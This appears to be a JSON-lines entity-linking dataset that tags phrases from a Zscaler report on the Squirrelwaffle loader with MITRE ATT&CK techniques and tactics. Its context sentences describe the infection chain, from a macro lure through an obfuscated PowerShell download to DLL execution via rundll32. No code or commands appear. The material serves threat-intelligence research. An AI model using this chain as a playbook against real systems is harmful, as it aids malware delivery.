{"mention": "Microsoft Word document lure containing a malicious macro", "context_left": "Figure 2: Squirrelwaffle", "context_right": "", "_context_left": "Figure 2: Squirrelwaffle ", "_context_right": "", "sentence_left": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "sentence_right": "Once the user enables the macro, an *AutoOpen()* subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "executes", "context_left": "Once the user enables the macro, an *AutoOpen()* subroutine is called which then", "context_right": "a malicious Visual Basic Application (VBA) macro.", "_context_left": "Once the user enables the macro, an *AutoOpen()* subroutine is called which then ", "_context_right": " a malicious Visual Basic Application (VBA) macro.", "sentence_left": "Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro", "sentence_right": "Here, the *AutoOpen()* subroutine calls another function *efile*() in the *bxh* module.", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Once the user enables the macro", "context_left": "", "context_right": ", an *AutoOpen()* subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.", "_context_left": "", "_context_right": ", an *AutoOpen()* subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.", "sentence_left": "Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro", "sentence_right": "Here, the *AutoOpen()* subroutine calls another function *efile*() in the *bxh* module.", "label": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566). While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).", "label_id": 260, "label_title": "User Execution", "label_link": "https://attack.mitre.org/techniques/T1204", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "then executes a malicious Visual Basic Application (VBA) macro.", "context_left": "Once the user enables the macro, an *AutoOpen()* subroutine is called which", "context_right": "", "_context_left": "Once the user enables the macro, an *AutoOpen()* subroutine is called which ", "_context_right": "", "sentence_left": "Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro", "sentence_right": "Here, the *AutoOpen()* subroutine calls another function *efile*() in the *bxh* module.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "UserForm object in the document which contains a VBS file named pin.vbs", "context_left": "There is a", "context_right": "that is embedded in the caption of the DocuSign image.", "_context_left": "There is a ", "_context_right": " that is embedded in the caption of the DocuSign image.", "sentence_left": "Here, the *AutoOpen()* subroutine calls another function *efile*() in the *bxh* module.", "sentence_right": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "The document that contains the macro code leverages cscript.exe", "context_left": "", "context_right": "to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "_context_left": "", "_context_right": " to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "sentence_left": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.", "sentence_right": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "extract the embedded VBS file", "context_left": "The document that contains the macro code leverages cscript.exe to", "context_right": ", which is written to the %ProgramData% folder, and executed using wscript.exe.", "_context_left": "The document that contains the macro code leverages cscript.exe to ", "_context_right": ", which is written to the %ProgramData% folder, and executed using wscript.exe.", "sentence_left": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.", "sentence_right": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "wscript.exe", "context_left": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using", "context_right": ".", "_context_left": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using ", "_context_right": ".", "sentence_left": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.", "sentence_right": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the", "context_right": "payload as shown in Figure 3.", "_context_left": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the ", "_context_right": " payload as shown in Figure 3.", "sentence_left": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "sentence_right": "The payload is written to %ProgramData% with the filename ww1.dll.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "VBS file", "context_left": "This", "context_right": "contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "_context_left": "This ", "_context_right": " contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "sentence_left": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "sentence_right": "The payload is written to %ProgramData% with the filename ww1.dll.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "obfuscated", "context_left": "This VBS file contains an", "context_right": "PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "_context_left": "This VBS file contains an ", "_context_right": " PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "sentence_left": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "sentence_right": "The payload is written to %ProgramData% with the filename ww1.dll.", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "PowerShell", "context_left": "This VBS file contains an obfuscated", "context_right": "script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "_context_left": "This VBS file contains an obfuscated ", "_context_right": " script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "sentence_left": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "sentence_right": "The payload is written to %ProgramData% with the filename ww1.dll.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download", "context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)", "_context_left": "![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download ", "_context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)", "sentence_left": "The payload is written to %ProgramData% with the filename ww1.dll.", "sentence_right": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Macro%20analysis1.PNG)", "_context_left": "![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Macro%20analysis1.PNG)", "sentence_left": "The payload is written to %ProgramData% with the filename ww1.dll.", "sentence_right": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "VBA code that drops a VBS file", "context_left": "![Figure 3: Example", "context_right": "in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)", "_context_left": "![Figure 3: Example ", "_context_right": " in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)", "sentence_left": "The payload is written to %ProgramData% with the filename ww1.dll.", "sentence_right": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download", "context_right": "", "_context_left": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download ", "_context_right": "", "sentence_left": "![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)", "sentence_right": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Example VBA code that drops a VBS file", "context_left": "Figure 3:", "context_right": "in the %ProgramData% folder that is used to download Squirrelwaffle", "_context_left": "Figure 3: ", "_context_right": " in the %ProgramData% folder that is used to download Squirrelwaffle", "sentence_left": "![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)", "sentence_right": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "The VBS file simply uses the IEX (Invoke-Expression) function to download the", "context_right": "loader.", "_context_left": "The VBS file simply uses the IEX (Invoke-Expression) function to download the ", "_context_right": " loader.", "sentence_left": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle", "sentence_right": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "VBS file", "context_left": "The", "context_right": "simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.", "_context_left": "The ", "_context_right": " simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.", "sentence_left": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle", "sentence_right": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "The payload DLL is executed via rundll32.exe", "context_left": "", "context_right": "by invoking the export function name *ldr*.", "_context_left": "", "_context_right": " by invoking the export function name *ldr*.", "sentence_left": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.", "sentence_right": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "executes", "context_left": "![Figure 4: Example VBS code that downloads and", "context_right": "the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "_context_left": "![Figure 4: Example VBS code that downloads and ", "_context_right": " the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "sentence_left": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "sentence_right": "Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
